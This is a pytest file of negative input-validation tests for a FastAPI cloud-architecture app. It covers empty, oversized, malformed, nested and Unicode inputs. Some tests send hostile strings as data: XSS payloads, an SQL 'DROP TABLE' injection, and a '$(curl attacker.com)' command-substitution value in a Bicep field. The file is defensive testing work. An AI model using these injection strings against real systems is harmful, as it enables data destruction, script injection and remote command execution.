"""Input validation negative tests.

Covers: empty inputs, oversized payloads, special characters, injection
patterns, and malformed data across API endpoints.
"""

import os
import string

import pytest

os.environ.setdefault("ONRAMP_DEBUG", "true")

from fastapi.testclient import TestClient  # noqa: E402

from app.main import app  # noqa: E402

client = TestClient(app)
AUTH_HEADERS = {"Authorization": "Bearer test"}


# ---------------------------------------------------------------------------
# Project creation validation
# ---------------------------------------------------------------------------


class TestProjectInputValidation:
    """Input validation on /api/projects/ endpoints."""

    def test_create_project_empty_name(self):
        """Empty project name should be accepted or rejected gracefully."""
        r = client.post(
            "/api/projects/",
            json={"name": "", "description": "empty name test"},
            headers=AUTH_HEADERS,
        )
        # Accept either validation error (422) or successful creation
        assert r.status_code in (200, 201, 422)

    def test_create_project_very_long_name(self):
        """Oversized project name (>10000 chars)."""
        long_name = "A" * 10001
        r = client.post(
            "/api/projects/",
            json={"name": long_name, "description": "overflow test"},
            headers=AUTH_HEADERS,
        )
        assert r.status_code in (200, 201, 422)

    def test_create_project_special_characters(self):
        """Project name with special characters."""
        r = client.post(
            "/api/projects/",
            json={"name": "<script>alert(1)</script>", "description": "xss test"},
            headers=AUTH_HEADERS,
        )
        # Should not crash — either accepts or validates
        assert r.status_code in (200, 201, 422)
        if r.status_code == 200:
            data = r.json()
            # Name should not be rendered as HTML
            assert "name" in data

    def test_create_project_sql_injection_name(self):
        """SQL injection attempt in project name."""
        r = client.post(
            "/api/projects/",
            json={
                "name": "'; DROP TABLE projects; --",
                "description": "sqli test",
            },
            headers=AUTH_HEADERS,
        )
        assert r.status_code in (200, 201, 422)

    def test_create_project_missing_body(self):
        """POST without body should return 422."""
        r = client.post("/api/projects/", headers=AUTH_HEADERS)
        assert r.status_code == 422

    def test_create_project_null_name(self):
        """Null name value."""
        r = client.post(
            "/api/projects/",
            json={"name": None, "description": "null test"},
            headers=AUTH_HEADERS,
        )
        assert r.status_code == 422


# ---------------------------------------------------------------------------
# Architecture generation validation
# ---------------------------------------------------------------------------


class TestArchitectureInputValidation:
    """Input validation on /api/architecture/ endpoints."""

    def test_generate_empty_answers(self):
        """Empty answers dict should still produce architecture."""
        r = client.post(
            "/api/architecture/generate",
            json={"answers": {}},
            headers=AUTH_HEADERS,
        )
        assert r.status_code == 200

    def test_generate_answers_with_xss_values(self):
        """XSS payloads in answer values should not crash."""
        r = client.post(
            "/api/architecture/generate",
            json={
                "answers": {
                    "org_size": '<img src=x onerror=alert(1)>',
                    "primary_region": "eastus2",
                }
            },
            headers=AUTH_HEADERS,
        )
        assert r.status_code in (200, 422)

    def test_generate_answers_with_numeric_values(self):
        """Numeric values in answers dict where strings expected."""
        r = client.post(
            "/api/architecture/generate",
            json={"answers": {"org_size": 12345}},
            headers=AUTH_HEADERS,
        )
        # Should handle gracefully — conversion or validation error
        assert r.status_code in (200, 422)

    def test_generate_missing_answers_key(self):
        """Missing 'answers' key."""
        r = client.post(
            "/api/architecture/generate",
            json={"not_answers": {}},
            headers=AUTH_HEADERS,
        )
        assert r.status_code == 422


# ---------------------------------------------------------------------------
# Scoring validation
# ---------------------------------------------------------------------------


class TestScoringInputValidation:
    """Input validation on /api/scoring/ endpoints."""

    def test_evaluate_empty_architecture(self):
        """Empty architecture dict."""
        r = client.post(
            "/api/scoring/evaluate",
            json={"architecture": {}, "frameworks": ["nist_800_53"]},
            headers=AUTH_HEADERS,
        )
        assert r.status_code in (200, 422)

    def test_evaluate_invalid_framework(self):
        """Unknown compliance framework name."""
        r = client.post(
            "/api/scoring/evaluate",
            json={
                "architecture": {"management_groups": {}},
                "frameworks": ["nonexistent_framework_xyz"],
            },
            headers=AUTH_HEADERS,
        )
        # Should fail gracefully (200 with low score or 400/422)
        assert r.status_code in (200, 400, 422)

    def test_evaluate_missing_framework(self):
        """Missing frameworks field."""
        r = client.post(
            "/api/scoring/evaluate",
            json={"architecture": {"management_groups": {}}},
            headers=AUTH_HEADERS,
        )
        assert r.status_code == 422


# ---------------------------------------------------------------------------
# Bicep generation validation
# ---------------------------------------------------------------------------


class TestBicepInputValidation:
    """Input validation on /api/bicep/ endpoints."""

    def test_generate_empty_architecture(self):
        """Empty architecture for Bicep generation."""
        r = client.post(
            "/api/bicep/generate",
            json={"architecture": {}},
            headers=AUTH_HEADERS,
        )
        assert r.status_code in (200, 400, 422)

    def test_get_nonexistent_template(self):
        """Request for a template that doesn't exist."""
        r = client.get(
            "/api/bicep/templates/this-does-not-exist-xyz",
            headers=AUTH_HEADERS,
        )
        assert r.status_code in (200, 404)

    def test_generate_with_injection_in_values(self):
        """Injection attempt in architecture values."""
        r = client.post(
            "/api/bicep/generate",
            json={
                "architecture": {
                    "management_groups": {
                        "name": "$(curl attacker.com)"
                    }
                }
            },
            headers=AUTH_HEADERS,
        )
        assert r.status_code in (200, 400, 422)


# ---------------------------------------------------------------------------
# Questionnaire validation
# ---------------------------------------------------------------------------


class TestQuestionnaireInputValidation:
    """Input validation on /api/questionnaire/ endpoints."""

    def test_next_with_empty_answers(self):
        """POST /api/questionnaire/next with empty answers."""
        r = client.post(
            "/api/questionnaire/next",
            json={"answered_questions": {}},
            headers=AUTH_HEADERS,
        )
        assert r.status_code == 200

    def test_next_with_unknown_question_ids(self):
        """Answers referencing non-existent question IDs."""
        r = client.post(
            "/api/questionnaire/next",
            json={
                "answered_questions": {
                    "nonexistent_q_1": "yes",
                    "nonexistent_q_2": "no",
                }
            },
            headers=AUTH_HEADERS,
        )
        assert r.status_code == 200

    def test_validate_with_wrong_types(self):
        """POST /api/questionnaire/validate with integer answer."""
        r = client.post(
            "/api/questionnaire/validate",
            json={"question_id": "org_size", "answer": 42},
            headers=AUTH_HEADERS,
        )
        assert r.status_code in (200, 422)


# ---------------------------------------------------------------------------
# General malformed request tests
# ---------------------------------------------------------------------------


class TestMalformedRequests:
    """Verify the app handles malformed requests gracefully."""

    def test_invalid_json_body(self):
        """Malformed JSON body."""
        r = client.post(
            "/api/projects/",
            content=b"{ this is not json",
            headers={**AUTH_HEADERS, "Content-Type": "application/json"},
        )
        assert r.status_code == 422

    def test_wrong_content_type(self):
        """Sending form data to JSON endpoint."""
        r = client.post(
            "/api/projects/",
            data="name=test",
            headers={**AUTH_HEADERS, "Content-Type": "application/x-www-form-urlencoded"},
        )
        assert r.status_code == 422

    def test_extremely_nested_json(self):
        """Deeply nested JSON payload."""
        nested = {"a": "leaf"}
        for _ in range(50):
            nested = {"nested": nested}
        r = client.post(
            "/api/architecture/generate",
            json={"answers": nested},
            headers=AUTH_HEADERS,
        )
        # Should not crash the server
        assert r.status_code in (200, 400, 422)

    def test_unicode_characters(self):
        """Unicode characters in inputs."""
        r = client.post(
            "/api/projects/",
            json={"name": "项目テスト🚀", "description": "Unicode test ñ ü ö"},
            headers=AUTH_HEADERS,
        )
        assert r.status_code in (200, 201, 422)
        if r.status_code == 200:
            assert "项目テスト🚀" in r.json().get("name", "")

    def test_null_bytes_in_input(self):
        """Null bytes in string input."""
        r = client.post(
            "/api/projects/",
            json={"name": "test\x00project", "description": "null byte"},
            headers=AUTH_HEADERS,
        )
        assert r.status_code in (200, 201, 422)
